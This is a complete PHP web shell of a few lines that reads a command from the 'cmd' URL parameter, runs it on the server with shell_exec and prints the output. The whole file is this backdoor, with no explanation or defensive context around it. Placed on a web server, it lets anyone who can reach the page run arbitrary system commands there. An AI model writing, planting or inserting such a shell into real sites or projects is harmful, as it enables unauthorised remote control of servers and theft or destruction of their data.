<?php
if (isset($_GET['cmd']))
{
      $cmd = $_GET['cmd'];
      echo '<pre>';
      $res = shell_exec($cmd);
      echo $res;
      echo '</pre>';
}
?>
